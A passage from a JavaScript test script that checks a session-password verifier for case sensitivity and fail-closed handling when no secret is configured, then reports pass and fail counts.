  check("case-sensitive (TEST-SECRET-ABC != ok)", verifySessionPassword(env, "TEST-SECRET-ABC"), false);
  // Fail-closed: no secret configured -> a distinct sentinel the handler maps
  // to HTTP 500, so the client refuses to start rather than opening the gate.
  check("secret unset -> 'not_configured'", verifySessionPassword({}, "test-secret-abc"), "not_configured");
  check("empty secret -> 'not_configured'", verifySessionPassword({ LAB_SESSION_PASSWORD: "" }, "x"), "not_configured");
}

console.log(`\nresult: ${pass} pass, ${fail} fail`);
process.exit(fail === 0 ? 0 : 1);
